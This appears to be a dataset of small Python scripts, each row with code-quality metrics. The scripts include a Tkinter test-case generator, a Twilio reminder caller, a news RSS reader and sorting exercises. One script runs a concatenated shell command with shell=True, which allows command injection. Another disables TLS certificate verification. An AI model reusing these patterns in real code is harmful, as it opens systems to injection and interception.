            text=""CHANGE CONSTRAINT"",
            fg=""black"",
            command=lambda: self.take_input(),
            width=20,
            font=""calibre"",
            bd=3,
        )
        self.change_values_button.grid(row=2, column=5, ipady=10, pady=(10, 18), padx=5)
        self.done_button = Button(
            gui,
            text=""HOME"",
            fg=""black"",
            command=lambda: self.done(self.output),
            width=20,
            font=""calibre"",
            bd=3,
        )
        self.done_button.grid(
            row=3, column=3, columnspan=2, ipady=10, pady=(10, 20), padx=5
        )
        self.button_exit_output = Button(
            gui,
            text="" EXIT "",
            fg=""black"",
            width=20,
            font=""calibre"",
            bd=3,
            command=lambda: gui.destroy(),
        )
        self.button_exit_output.grid(
            row=3, column=4, columnspan=2, ipady=10, pady=(10, 20), padx=5
        )

    def try_forget(self):
        self.output.grid_forget()
        self.copy_button.grid_forget()
        self.generate_button.grid_forget()
        self.change_values_button.grid_forget()
        self.done_button.grid_forget()
        self.y_scroll.grid_forget()
        self.x_scroll.grid_forget()
        self.button_exit_output.grid_forget()
        try:
            self.constraints.grid_forget()
        except AttributeError:
            pass

    def get_t(self, r):
        self.test_case_count_label = Label(
            gui, text=""T  = "", font=(""calibre"", 10, ""bold""), width=17
        )  # Type 1
        self.test_case_count = Entry(
            gui, textvariable=t, font=(""calibre"", 10, ""normal"")
        )
        self.test_case_count_label.grid(row=r, column=0, pady=20, ipady=1)  # Type 1
        self.test_case_count.grid(row=r, column=1)

    def get_n(self, r):
        self.minimum_value_of_n = Entry(
            gui, textvariable=n_min, font=(""calibre"", 10, ""normal"")
        )
        self.min_max_values_of_n_label = Label(
            gui, text="" <= n <="", font=(""calibre"", 10, ""bold"")
        )
        self.maximum_value_of_n = Entry(
            gui, textvariable=n_max, font=(""calibre"", 10, ""normal"")
        )
        self.minimum_value_of_n.grid(row=r, column=0, padx=10, pady=10)
        self.min_max_values_of_n_label.grid(row=r, column=1, ipadx=5, ipady=1)
        self.maximum_value_of_n.grid(row=r, column=2, padx=(10, 10))

    def get_m(self, r):
        self.minimum_value_of_m = Entry(
            gui, textvariable=m_min, font=(""calibre"", 10, ""normal"")
        )
        self.min_max_values_of_m_label = Label(
            gui, text=""<= m <="", font=(""calibre"", 10, ""bold"")
        )
        self.maximum_value_of_m = Entry(
            gui, textvariable=m_max, font=(""calibre"", 10, ""normal"")
        )
        self.minimum_value_of_m.grid(row=r, column=0, padx=10, pady=10)
        self.min_max_values_of_m_label.grid(row=r, column=1, padx=10, ipadx=5, ipady=1)
        self.maximum_value_of_m.grid(row=r, column=2, padx=10)

    def get_k(self, r):
        self.minimum_value_of_k = Entry(
            gui, textvariable=k_min, font=(""calibre"", 10, ""normal"")
        )
        self.min_max_values_of_k_label = Label(
            gui, text="" <= k <="", font=(""calibre"", 10, ""bold"")
        )
        self.maximum_value_of_k = Entry(
            gui, textvariable=k_max, font=(""calibre"", 10, ""normal"")
        )
        self.minimum_value_of_k.grid(row=r, column=0, pady=10)
        self.min_max_values_of_k_label.grid(row=r, column=1)
        self.maximum_value_of_k.grid(row=r, column=2)

    def get_a(self, r):
        self.minimum_value_of_ai = Entry(
            gui, textvariable=a_min, font=(""calibre"", 10, ""normal"")
        )
        self.min_max_values_of_ai_label = Label(
            gui, text="" <= Ai <="", font=(""calibre"", 10, ""bold"")
        )
        self.maximum_value_of_ai = Entry(
            gui, textvariable=a_max, font=(""calibre"", 10, ""normal"")
        )
        self.minimum_value_of_ai.grid(row=r, column=0, padx=10, pady=10)
        self.min_max_values_of_ai_label.grid(row=r, column=1, ipadx=2, ipady=1)
        self.maximum_value_of_ai.grid(row=r, column=2)

    def get_b(self, r):
        self.minimum_value_of_bi = Entry(
            gui, textvariable=b_min, font=(""calibre"", 10, ""normal"")
        )
        self.min_max_values_of_bi_label = Label(
            gui, text="" <= Bi <= "", font=(""calibre"", 10, ""bold"")
        )
        self.maximum_value_of_bi = Entry(
            gui, textvariable=b_max, font=(""calibre"", 10, ""normal"")
        )
        self.minimum_value_of_bi.grid(row=r, column=0, pady=10)
        self.min_max_values_of_bi_label.grid(row=r, column=1, padx=10)
        self.maximum_value_of_bi.grid(row=r, column=2, padx=10)

    def get_char_list(self, r):
        self.char_list_label = Label(
            gui, text=""  Characters :  "", font=(""calibre"", 10, ""bold""), width=17
        )
        self.char_list = Entry(
            gui, textvariable=char_lis, font=(""calibre"", 10, ""normal""), width=43
        )
        self.char_list.insert(END, ""(Space separated characters)"")
        self.char_list.bind(""<FocusIn>"", lambda args: self.char_list.delete(""0"", ""end""))
        self.char_list_label.grid(row=r, column=0, pady=10)
        self.char_list.grid(row=r, column=1, columnspan=2, padx=10)

    def show_button(self, r):
        self.back_btn = Button(
            gui,
            text="" HOME "",
            command=lambda: self.forget_testcase_take_input_screen(1),
            font=""calibre"",
            bd=3,
        )
        self.sub_btn = Button(
            gui, text="" GENERATE "", command=self.submit, font=""calibre"", bd=3
        )
        self.exit_btn = Button(
            gui, text="" EXIT "", command=lambda: gui.destroy(), font=""calibre"", bd=3
        )
        self.back_btn.grid(row=r, column=0, pady=(20, 20), ipady=1)
        self.sub_btn.grid(row=r, column=1, pady=(20, 20), ipady=1)
        self.exit_btn.grid(row=r, column=2, pady=(20, 20), ipady=1)
        self.copyright_label.place(relx=0.9, y=0)

    def submit(self):
        try:
            self.t = int(self.test_case_count.get())
            if self.t == 0 or self.t > 10000:
                return
        except ValueError:
            return
        except AttributeError:
            pass
        try:
            self.n_min = min(
                int(self.minimum_value_of_n.get()), int(self.maximum_value_of_n.get())
            )
            self.n_max = max(
                int(self.minimum_value_of_n.get()), int(self.maximum_value_of_n.get())
            )
            if self.n_min > self.n_max or self.n_max == 0 or self.n_max > 10000000:
                return
        except ValueError:
            return
        except AttributeError:
            pass
        try:
            self.m_min = min(
                int(self.minimum_value_of_m.get()), int(self.maximum_value_of_m.get())
            )
            self.m_max = max(
                int(self.minimum_value_of_m.get()), int(self.maximum_value_of_m.get())
            )
            if self.m_min > self.m_max or self.m_max == 0 or self.m_max > 10000000:
                return
        except ValueError:
            return
        except AttributeError:
            pass
        try:
            self.k_min = min(
                int(self.minimum_value_of_k.get()), int(self.maximum_value_of_k.get())
            )
            self.k_max = max(
                int(self.minimum_value_of_k.get()), int(self.maximum_value_of_k.get())
            )
            if self.k_min > self.k_max or self.k_max == 0 or self.k_max > 10000000:
                return
        except ValueError:
            return
        except AttributeError:
            pass
        try:
            self.a_min = min(
                int(self.minimum_value_of_ai.get()), int(self.maximum_value_of_ai.get())
            )
            self.a_max = max(
                int(self.minimum_value_of_ai.get()), int(self.maximum_value_of_ai.get())
            )
            if self.a_min > self.a_max or self.a_max == 0 or self.a_max > 10000000:
                return
        except ValueError:
            return
        except AttributeError:
            pass
        try:
            self.b_min = min(
                int(self.minimum_value_of_bi.get()), int(self.maximum_value_of_bi.get())
            )
            self.b_max = max(
                int(self.minimum_value_of_bi.get()), int(self.maximum_value_of_bi.get())
            )
            if self.b_min > self.b_max or self.b_max == 0 or self.b_max > 10000000:
                return
        except ValueError:
            return
        except AttributeError:
            pass
        try:
            self.char_lis = list(self.char_list.get().split())
            if self.char_lis[0] == ""(Space"":
                return
        except IndexError:
            return
        except ValueError:
            return
        except AttributeError:
            pass
        try:
            if self.t * self.n_max > 10000000:
                return
        except AttributeError:
            pass
        try:
            if self.m_max * self.n_max > 10000000:
                return
        except AttributeError:
            pass
        try:
            if self.t * self.m_max > 10000000:
                return
        except AttributeError:
            pass
        finally:
            self.forget_testcase_take_input_screen()
            self.display()
            self.generate()

    def forget_testcase_take_input_screen(self, check=0):
        try:
            self.test_case_count_label.grid_forget()
            self.test_case_count.grid_forget()
        except AttributeError:
            pass
        try:
            self.minimum_value_of_n.grid_forget()
            self.min_max_values_of_n_label.grid_forget()
            self.maximum_value_of_n.grid_forget()
        except AttributeError:
            pass
        try:
            self.minimum_value_of_ai.grid_forget()
            self.min_max_values_of_ai_label.grid_forget()
            self.maximum_value_of_ai.grid_forget()
        except AttributeError:
            pass
        try:
            self.minimum_value_of_bi.grid_forget()
            self.min_max_values_of_bi_label.grid_forget()
            self.maximum_value_of_bi.grid_forget()
        except AttributeError:
            pass
        try:
            self.minimum_value_of_m.grid_forget()
            self.min_max_values_of_m_label.grid_forget()
            self.maximum_value_of_m.grid_forget()
        except AttributeError:
            pass
        try:
            self.minimum_value_of_k.grid_forget()
            self.min_max_values_of_k_label.grid_forget()
            self.maximum_value_of_k.grid_forget()
        except AttributeError:
            pass
        try:
            self.char_list_label.grid_forget()
            self.char_list.delete(""0"", ""end"")
            self.char_list.grid_forget()
        except AttributeError:
            pass
        try:
            self.constraints.grid_forget()
        except AttributeError:
            pass
        finally:
            self.sub_btn.grid_forget()
            self.back_btn.grid_forget()
            self.exit_btn.grid_forget()

        if check:
            self.retrieve_home()


class Type1(Case):
    def __init__(self, master):
        super(Type1, self).__init__(master)  # Type 1
        self.forget_home()
        self.take_input()

    def take_input(self):
        try:
            self.try_forget()  # Type 1
        except AttributeError:
            pass
        self.get_t(0)
        self.get_n(1)
        self.get_a(2)
        self.show_button(3)

    def generate(self):  # Type 1
        self.forget_testcase_take_input_screen()
        self.output.delete(""1.0"", END)
        self.output.insert(END, self.t)
        self.output.insert(END, ""\n"")
        for i in range(self.t):
            self.n = randint(self.n_min, self.n_max)
            self.output.insert(END, self.n)
            self.output.insert(END, ""\n"")
            self.a = [0] * self.n
            for j in range(self.n):
                self.a[j] = randint(self.a_min, self.a_max)
            self.output.insert(END, self.a)
            self.output.insert(END, ""\n"")


class Type2(Case):  # Type 2
    def __init__(self, master):
        super(Type2, self).__init__(master)
        self.forget_home()
        self.take_input()

    def take_input(self):  # Type 2
        try:
            self.try_forget()
        except AttributeError:
            pass
        self.get_t(0)
        self.get_n(1)
        self.get_m(2)
        self.get_a(3)
        self.show_button(4)

    def generate(self):  # Type 2
        self.output.delete(""1.0"", END)
        self.output.insert(END, self.t)
        self.output.insert(END, ""\n"")
        for i in range(self.t):
            self.n = randint(self.n_min, self.n_max)
            self.m = randint(self.m_min, self.m_max)
            self.output.insert(END, self.n)
            self.output.insert(END, "" "")
            self.output.insert(END, self.m)
            self.output.insert(END, ""\n"")
            self.a = [0] * self.n
            for j in range(self.n):
                self.a[j] = randint(self.a_min, self.a_max)
            self.output.insert(END, self.a)
            self.output.insert(END, ""\n"")


class Type3(Case):
    def __init__(self, master):
        super(Type3, self).__init__(master)
        self.forget_home()
        self.take_input()

    def take_input(self):  # Type 3
        try:
            self.try_forget()
        except AttributeError:
            pass
        self.get_t(0)
        self.get_a(1)
        self.get_b(2)
        self.show_button(3)

    def generate(self):  # Type 3
        self.output.delete(""1.0"", END)
        self.output.insert(END, self.t)
        self.output.insert(END, ""\n"")
        for i in range(self.t):
            self.a = randint(self.a_min, self.a_max)
            self.b = randint(self.b_min, self.b_max)
            self.output.insert(END, self.a)
            self.output.insert(END, "" "")
            self.output.insert(END, self.b)
            self.output.insert(END, ""\n"")


class Type4(Case):
    def __init__(self, master):
        super(Type4, self).__init__(master)
        self.forget_home()
        self.take_input()

    def take_input(self):  # Type 4
        try:
            self.try_forget()
        except AttributeError:
            pass
        self.get_t(0)
        self.get_n(1)
        self.get_m(2)
        self.get_a(3)
        self.get_b(4)
        self.show_button(5)

    def generate(self):  # Type 4
        self.output.delete(""1.0"", END)
        self.output.insert(END, self.t)
        self.output.insert(END, ""\n"")
        for i in range(self.t):
            self.n = randint(self.n_min, self.n_max)
            self.m = randint(self.m_min, self.m_max)
            self.output.insert(END, self.n)
            self.output.insert(END, "" "")
            self.output.insert(END, self.m)
            self.output.insert(END, ""\n"")
            self.a = [0] * self.n
            self.b = [0] * self.m
            for j in range(self.n):
                self.a[j] = randint(self.a_min, self.a_max)
            self.output.insert(END, self.a)
            self.output.insert(END, ""\n"")
            for j in range(self.m):
                self.b[j] = randint(self.b_min, self.b_max)
            self.output.insert(END, self.b)
            self.output.insert(END, ""\n"")


#  ------------------------------------------------- ###
#  ------------------------------------------------- ###
#  ### Developed by TANMAY KHANDELWAL (aka Dude901). ###
#  _________________________________________________ ###
#  _________________________________________________ ###


class Type5(Case):
    def __init__(self, master):
        super(Type5, self).__init__(master)
        self.forget_home()
        self.take_input()

    def take_input(self):  # Type 5
        try:
            self.try_forget()
        except AttributeError:
            pass
        self.get_t(0)
        self.get_n(1)
        self.get_m(2)
        self.get_k(3)
        self.show_button(4)

    def generate(self):  # Type 5
        self.output.delete(""1.0"", END)
        self.output.insert(END, self.t)
        self.output.insert(END, ""\n"")
        for i in range(self.t):
            self.n = randint(self.n_min, self.n_max)
            self.m = randint(self.m_min, self.m_max)
            self.k = randint(self.k_min, self.k_max)
            self.output.insert(END, self.n)
            self.output.insert(END, "" "")
            self.output.insert(END, self.m)
            self.output.insert(END, "" "")
            self.output.insert(END, self.k)
            self.output.insert(END, ""\n"")


class Type6(Case):
    def __init__(self, master):  # Type 6
        super(Type6, self).__init__(master)
        self.forget_home()
        self.take_input()

    def take_input(self):  # Type 6
        try:
            self.try_forget()
        except AttributeError:
            pass  # Type 6
        self.constraints = Label(
            gui,
            text=""Enter Constraints"",
            fg=""white"",
            height=1,
            font=(""calibre"", 12, ""normal""),
        )
        self.constraints.configure(bg=mycolor)
        self.constraints.grid(row=0, column=1)
        self.get_n(1)
        self.get_m(2)
        self.get_a(3)
        self.show_button(4)

    def generate(self):  # Type 6
        self.output.delete(""1.0"", END)
        self.n = randint(self.n_min, self.n_max)
        self.m = randint(self.m_min, self.m_max)
        self.output.insert(END, self.n)
        self.output.insert(END, "" "")
        self.output.insert(END, self.m)
        self.output.insert(END, ""\n"")
        for i in range(self.n):
            self.a = [0] * self.m
            for j in range(self.m):
                self.a[j] = randint(self.a_min, self.a_max)
            self.output.insert(END, self.a)
            self.output.insert(END, ""\n"")


class Type7(Case):
    def __init__(self, master):  # Type 7
        super(Type7, self).__init__(master)
        self.forget_home()
        self.take_input()

    def take_input(self):  # Type 7
        try:
            self.try_forget()
        except AttributeError:
            pass
        self.get_t(0)
        self.get_char_list(1)
        self.get_n(2)
        self.show_button(3)

    def generate(self):  # Type 7
        self.output.delete(""1.0"", END)
        self.output.insert(END, self.t)
        self.output.insert(END, ""\n"")
        for i in range(self.t):
            self.n = randint(self.n_min, self.n_max)
            self.output.insert(END, self.n)
            self.output.insert(END, ""\n"")
            self.a = choices(self.char_lis, k=self.n)
            self.output.insert(END, """".join(self.a))
            self.output.insert(END, ""\n"")


class Type8(Case):
    def __init__(self, master):  # Type 8
        super(Type8, self).__init__(master)
        self.forget_home()
        self.take_input()

    def take_input(self):
        try:  # Type 8
            self.try_forget()
        except AttributeError:
            pass
        self.get_t(0)
        self.get_n(1)
        self.get_m(2)
        self.get_a(3)
        self.get_b(4)
        self.show_button(5)

    def generate(self):  # Type 8
        self.output.delete(""1.0"", END)
        self.output.insert(END, self.t)
        self.output.insert(END, ""\n"")
        for i in range(self.t):
            self.n = randint(self.n_min, self.n_max)
            self.m = randint(self.m_min, self.m_max)
            self.output.insert(END, self.n)
            self.output.insert(END, "" "")
            self.output.insert(END, self.m)
            self.output.insert(END, ""\n"")
            for j in range(self.m):
                self.a = randint(self.a_min, self.a_max)
                self.b = randint(self.b_min, self.b_max)
                self.output.insert(END, self.a)
                self.output.insert(END, "" "")
                self.output.insert(END, self.b)
                self.output.insert(END, ""\n"")


class Type9(Case):
    def __init__(self, master):
        super(Type9, self).__init__(master)
        self.forget_home()
        self.take_input()

    def take_input(self):  # Type 9
        try:
            self.try_forget()
        except AttributeError:
            pass
        self.get_t(0)
        self.get_char_list(1)
        self.get_n(2)
        self.show_button(3)

    def generate(self):  # Type 9
        self.output.delete(""1.0"", END)
        self.output.insert(END, self.t)
        self.output.insert(END, ""\n"")
        for i in range(self.t):
            self.n = randint(self.n_min, self.n_max)
            self.a = choices(self.char_lis, k=self.n)
            self.output.insert(END, """".join(self.a))
            self.output.insert(END, ""\n"")


class Type10(Case):
    def __init__(self, master):
        super(Type10, self).__init__(master)
        self.forget_home()
        self.take_input()

    def take_input(self):  # Type 10
        try:
            self.try_forget()
        except AttributeError:
            pass
        self.get_t(0)
        self.get_n(1)
        self.get_k(2)
        self.get_m(3)
        self.get_a(4)
        self.show_button(5)

    def generate(self):  # Type 10
        self.output.delete(""1.0"", END)
        self.output.insert(END, self.t)
        self.output.insert(END, ""\n"")
        for i in range(self.t):
            self.n = randint(self.n_min, self.n_max)
            self.k = randint(self.k_min, self.k_max)
            self.m = randint(self.m_min, self.m_max)
            self.output.insert(END, self.n)
            self.output.insert(END, "" "")
            self.output.insert(END, self.k)
            self.output.insert(END, "" "")  # Type 10
            self.output.insert(END, self.m)
            self.output.insert(END, ""\n"")
            self.a = [0] * self.n
            for j in range(self.n):
                self.a[j] = randint(self.a_min, self.a_max)
            self.output.insert(END, self.a)
            self.output.insert(END, ""\n"")


if __name__ == ""__main__"":
    gui = Tk()
    gui.title(""TEST CASE GENERATOR"")
    gui.configure(bg=mycolor)

    if os.environ.get(""DISPLAY"", """") == """":
        print(""no display found, using:0,0"")
        os.environ.__setitem__(""DISPLAY"", "":0.0"")
    else:
        print(""found display"")

    t = IntVar()
    n_min = IntVar()
    n_max = IntVar()
    m_min = IntVar()
    m_max = IntVar()
    k_min = IntVar()
    k_max = IntVar()
    a_min = IntVar()
    a_max = IntVar()
    b_min = IntVar()
    b_max = IntVar()
    char_lis = StringVar()

    Case.home(self=Case)

    gui.mainloop()
    gui.mainloop()

    #  ------------------------------------------------- ###
    #  ------------------------------------------------- ###
    #  ### Developed by TANMAY KHANDELWAL (aka Dude901). ###
    #  _________________________________________________ ###
    #  _________________________________________________ ###
",31733,643,884,73,46,17,0,49.0,159,38,4,81.0,48,,119,276.0782000346155,678.35232645879,3.375,bajo,Yes,False,False,Medium-High,id22
caller.py,"# The project automates calls for people from the firebase cloud database and the schedular keeps it running and checks for entries
# every 1 hour using aps scedular
# The project can be used to set 5 min before reminder calls to a set of people for doing a particular job
import os
from firebase_admin import credentials, firestore, initialize_app
from datetime import datetime, timedelta
import time
from time import gmtime, strftime
import twilio
from twilio.rest import Client

# twilio credentials
acc_sid = """"
auth_token = """"
client = Client(acc_sid, auth_token)

# firebase credentials
# key.json is your certificate of firebase project
cred = credentials.Certificate(""key.json"")
default_app = initialize_app(cred)
db = firestore.client()
database_reference = db.collection(""on_call"")

# Here the collection name is on_call which has documents with fields phone , from (%H:%M:%S time to call the person),date

# gets data from cloud database and calls 5 min prior the time (from time) alloted in the database
def search():

    calling_time = datetime.now()
    one_hours_from_now = (calling_time + timedelta(hours=1)).strftime(""%H:%M:%S"")
    current_date = str(strftime(""%d-%m-%Y"", gmtime()))
    docs = db.collection(u""on_call"").where(u""date"", u""=="", current_date).stream()
    list_of_docs = []
    for doc in docs:

        c = doc.to_dict()
        if (calling_time).strftime(""%H:%M:%S"") <= c[""from""] <= one_hours_from_now:
            list_of_docs.append(c)
    print(list_of_docs)

    while list_of_docs:
        timestamp = datetime.now().strftime(""%H:%M"")
        five_minutes_prior = (timestamp + timedelta(minutes=5)).strftime(""%H:%M"")
        for doc in list_of_docs:
            if doc[""from""][0:5] == five_minutes_prior:
                phone_number = doc[""phone""]
                call = client.calls.create(
                    to=phone_number,
                    from_=""add your twilio number"",
                    url=""http://demo.twilio.com/docs/voice.xml"",
                )
                list_of_docs.remove(doc)
",2045,33,37,7,8,8,0,1.0,6,5,3,9.0,9,,14,33.28421251514428,50.18947501009619,1.5,medio,No,False,False,Low,id23
subpinsta.py,"# trggering the process
import os
import subprocess
import sys


def instasubprocess(user, tags, type, productId):
    try:
        child_env = sys.executable
        file_pocessing = (
            os.getcwd()
            + ""/insta_datafetcher.py ""
            + user
            + "" ""
            + tags
            + "" ""
            + type
            + "" ""
            + productId
        )
        command = child_env + "" "" + file_pocessing
        result = subprocess.Popen(command, shell=True)
        result.wait()
    except:
        print(""error::instasubprocess>>"", sys.exc_info()[1])


if __name__ == ""__main__"":
    instasubprocess(user=""u2"", tags=""food"", type=""hashtags"", productId=""abc"")
",702,14,24,4,1,1,0,1.0,2,11,2,22.0,19,,33,82.71062275542812,144.94647495169912,1.1578947368421053,medio,No,False,False,Low,id24
Google_News.py,"import ssl
from urllib.request import urlopen

from bs4 import BeautifulSoup as soup


def news(xml_news_url, counter):
    """"""Print select details from a html response containing xml
    @param xml_news_url: url to parse
    """"""

    context = ssl._create_unverified_context()
    Client = urlopen(xml_news_url, context=context)
    xml_page = Client.read()
    Client.close()

    soup_page = soup(xml_page, ""xml"")

    news_list = soup_page.findAll(""item"")
    i = 0  # counter to print n number of news items

    for news in news_list:
        print(f""news title:   {news.title.text}"")  # to print title of the news
        print(f""news link:    {news.link.text}"")  # to print link of the news
        print(f""news pubDate: {news.pubDate.text}"")  # to print published date
        print(""+-"" * 20, ""\n\n"")

        if i == counter:
            break
        i = i + 1


# you can add google news 'xml' URL here for any country/category
news_url = ""https://news.google.com/news/rss/?ned=us&gl=US&hl=en""
sports_url = ""https://news.google.com/news/rss/headlines/section/topic/SPORTS.en_in/Sports?ned=in&hl=en-IN&gl=IN""

# now call news function with any of these url or BOTH
news(news_url, 10)
news(sports_url, 5)
",1216,24,23,11,6,2,3,,3,3,3,6.0,5,,9,16.36452797660028,27.0,1.8,alto,No,False,False,Low,id25
num-py.py,"import numpy as np

# to check if shape are equal and find there power
def get_array(x, y):
    a = np.shape(x)
    b = np.shape(y)

    if a == b:
        np_pow_array = x ** y
        print(""Array of powers without using np.power: "", np_pow_array)

        print(""Array of powers using np.power: "", np.power(x, y))
    else:
        print(""Error : Shape of the given arrays is not equal."")


# 0d array
np_arr1 = np.array(3)
np_arr2 = np.array(4)
# 1d array
np_arr3 = np.array([1, 2])
np_arr4 = np.array([3, 4])
# 2d array
np_arr5 = np.array([[1, 2], [3, 4]])
np_arr6 = np.array([[5, 6], [7, 8]])

get_array(np_arr1, np_arr2)
print()
get_array(np_arr3, np_arr4)
print()
get_array(np_arr5, np_arr6)
",700,21,21,6,4,4,0,1.0,2,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,alto,No,False,False,Low,id26
"input matrice,product any order!.py","# inputing 2 matrices:

# matrice 1:

rows = int(input(""Enter the number of rows of the matrice 1""))
coloumns = int(input(""Enter the coloumns of the matrice 1""))
matrice = []
rowan = []

for i in range(0, rows):
    for j in range(0, coloumns):
        element = int(input(""enter the element""))
        rowan.append(element)
    print(""one row completed"")
    matrice.append(rowan)
    rowan = []

print(""matrice 1 is \n"")
for ch in matrice:
    print(ch)
A = matrice

# matrice 2:

rows_ = coloumns
coloumns_ = int(input(""Enter the coloumns of the matrice 2""))
rowan = []
matrix = []

for i in range(0, rows_):
    for j in range(0, coloumns_):
        element = int(input(""enter the element""))
        rowan.append(element)
    print(""one row completed"")
    matrix.append(rowan)
    rowan = []

print(""Matrice 2 is\n"")
for ch in matrix:
    print(ch)

B = matrix

# creating empty frame:

result = []
for i in range(0, rows):
    for j in range(0, coloumns_):
        rowan.append(0)
    result.append(rowan)
    rowan = []
print(""\n"")
print(""The frame work of result"")
for ch in result:
    print(ch)


# Multiplication of the two matrices:

for i in range(len(A)):
    for j in range(len(B[0])):
        for k in range(len(B)):
            result[i][j] += A[i][k] * B[k][j]

print(""\n"")
print(""The product of the 2 matrices is \n"")

for i in result:
    print(i)
",1437,48,48,16,5,5,0,0.0,0,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,medio,No,True,False,Low,id27
hand_motion_recognizer.py,"import mediapipe as mp
import cv2
import numpy as np
import uuid
import os

mp_drawing = mp.solutions.drawing_utils
mp_hands = mp.solutions.hands

cap = cv2.VideoCapture(0)

with mp_hands.Hands(min_detection_confidence=0.8, min_tracking_confidence=0.5) as hands: 
    while cap.isOpened():
        ret, frame = cap.read()
        
        # BGR 2 RGB
        image = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        
        # Flip on horizontal
        image = cv2.flip(image, 1)
        
        # Set flag
        image.flags.writeable = False
        
        # Detections
        results = hands.process(image)
        
        # Set flag to true
        image.flags.writeable = True
        
        # RGB 2 BGR
        image = cv2.cvtColor(image, cv2.COLOR_RGB2BGR)
        
        # Detections
        print(results)
        
        # Rendering results
        if results.multi_hand_landmarks:
            for num, hand in enumerate(results.multi_hand_landmarks):
                mp_drawing.draw_landmarks(image, hand, mp_hands.HAND_CONNECTIONS, 
                                        mp_drawing.DrawingSpec(color=(121, 22, 76), thickness=2, circle_radius=4),
                                        mp_drawing.DrawingSpec(color=(250, 44, 250), thickness=2, circle_radius=2),
                                         )
            
        
        cv2.imshow('Hand Tracking', image)

        if cv2.waitKey(10) & 0xFF == ord('q'):
            break

cap.release()
cv2.destroyAllWindows()
",1499,26,29,15,8,8,0,0.0,0,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,alto,No,False,False,,id28
recursive-quick-sort.py,"def quick_sort(l):
    if len(l) <= 1:
        return l
    else:
        return (
            quick_sort([e for e in l[1:] if e <= l[0]])
            + [l[0]]
            + quick_sort([e for e in l[1:] if e > l[0]])
        )
",227,6,9,0,0,0,0,1.0,6,5,3,10.0,9,,15,33.28421251514428,53.77443751081735,1.6666666666666667,medio,No,False,False,Low,id29
serial_scanner.py,"import sys

import serial


# A serial port-scanner for linux and windows platforms

# Author: Julio CÃ©sar Echeverri Marulanda
# e-mail: julio.em7@gmail.com
# blog:   blogdelingeniero1.wordpress.com

# You should have installed the PySerial module to use this method.

# You can install pyserial with the following line:      pip install pyserial


def ListAvailablePorts():
    # This function return a list containing the string names for Virtual Serial Ports
    # availables in the computer (this function works only for Windows & Linux Platforms but you can extend it)
    # if there isn't available ports, returns an empty List
    AvailablePorts = []
    platform = sys.platform
    if platform == ""win32"":
        for i in range(255):
            try:
                ser = serial.Serial(i, 9600)
            except serial.serialutil.SerialException:
                pass
            else:
                AvailablePorts.append(ser.portstr)
                ser.close()

    elif platform == ""linux"":
        for i in range(0, 255):
            try:
                ser = serial.Serial(""/dev/ttyUSB"" + str(i))
            except serial.serialutil.SerialException:
                pass
            else:
                AvailablePorts.append(""/dev/ttyUSB"" + str(i))
                ser.close()
    else:
        print(
            """"""This method was developed only for linux and windows
                the current platform isn't recognised""""""
        )
    if len(AvailablePorts) == 0:
        print(""NO port in use"")
        return 0
    else:
        return AvailablePorts


#  EXAMPLE OF HOW IT WORKS

#  if an Arduino is connected to the computer, the port will be show in the terminal
#  print ListAvailablePorts()
",1728,30,33,12,12,12,0,1.0,10,5,2,10.0,8,,15,26.0,49.82892142331044,1.25,alto,No,False,False,Low,id30
diceV2_dynamic.py,"import random


# Class that that holds dice-functions. You can set the amount of sides and roll with each dice object.
class Dice:
    def __init__(self):
        self.sideCount = 6

    def setSides(self, sides):
        if sides > 3:
            self.sides = sides
        else:
            print(
                ""This absolutely shouldn't ever happen. The programmer sucks or someone ""
                ""has tweaked with code they weren't supposed to touch!""
            )

    def roll(self):
        return random.randint(1, self.sides)


# =====================================================================


# Checks to make sure that the input is actually an integer.
# This implementation can be improved greatly of course.
def checkInput(sides):
    try:
        if int(sides) != 0:
            if (
                float(sides) % int(sides) == 0
            ):  # excludes the possibility of inputted floats being rounded.
                return int(sides)
        else:
            return int(sides)

    except ValueError:
        print(""Invalid input!"")
        return None


# Picks a number that is at least of a certain size.
# That means in this program, the dices being possible to use in 3 dimensional space.
def pickNumber(item, question_string, lower_limit):
    while True:
        item = input(question_string)
        item = checkInput(item)
        if type(item) == int:
            if item <= lower_limit:
                print(""Input too low!"")
                continue
            else:
                return item


# Main-function of the program that sets up the dices for the user as they want them.
def getDices():
    dices = []
    sides = None
    diceAmount = None
    sideLowerLimit = 3  # Do Not Touch!
    diceLowerLimit = 1  # Do Not Touch!

    sides = pickNumber(sides, ""How many sides will the dices have?: "", sideLowerLimit)
    diceAmount = pickNumber(
        diceAmount, ""How many dices will do you want?: "", diceLowerLimit
    )

    for i in range(0, diceAmount):
        d = Dice()
        d.setSides(sides)
        dices.append(d)

    return dices


# =================================================================
# Output section.


def output():
    dices = getDices()
    input(""Do you wanna roll? press enter"")
    cont = True
    while cont:
        rollOutput = """"
        for dice in dices:
            rollOutput = rollOutput + str(dice.roll()) + "", ""
        rollOutput = rollOutput[:-2]
        print(rollOutput)

        print(""do you want to roll again?"")
        ans = input(""press enter to continue, and [exit] to exit"")
        if ans == ""exit"":
            cont = False


if __name__ == ""__main__"":
    output()
",2689,61,67,23,12,9,0,7.0,20,11,7,21.0,20,,32,106.09004635215048,152.156400069231,3.675,medio,Yes,True,True,Low-Medium,id31
speakListen.py,"import time
from colorama import Fore, Back, Style
import speech_recognition as sr
import os
import pyttsx3
import datetime
from rich.progress import Progress


python = pyttsx3.init(""sapi5"") # name of the engine is set as Python
voices = python.getProperty(""voices"")
#print(voices)
python.setProperty(""voice"", voices[1].id)
python.setProperty(""rate"", 140)


def speak(text):
    """"""[This function would speak aloud some text provided as parameter]

    Args:
        text ([str]): [It is the speech to be spoken]
    """"""    
    python.say(text)
    python.runAndWait()

def greet(g):
    """"""Uses the datetime library to generate current time and then greets accordingly.
    

    Args:
        g (str): To decide whether to say hello or good bye
    """"""
    if g == ""start"" or g == ""s"":
        h = datetime.datetime.now().hour
        text = ''
        if h > 12 and h < 17:
            text = ""Hello ! Good Afternoon  ""
        elif h < 12 and h > 0:
            text = ""Hello! Good Morning  ""
        elif h >= 17 :
            text = ""Hello! Good Evening ""
        text += "" I am Python, How may i help you ?""
        speak(text)    
    
    elif g == ""quit"" or g == ""end"" or g == ""over"" or g == ""e"":
        text = 'Thank you!. Good Bye ! '
        speak(text)

def hear():
    """"""[It will process the speech of user using Google_Speech_Recognizer(recognize_google)]

    Returns:
        [str]: [Speech of user as a string in English(en - IN)]
    """"""    
    r = sr.Recognizer()
    """"""Reconizer is a class which has lot of functions related to Speech i/p and o/p.
    """"""
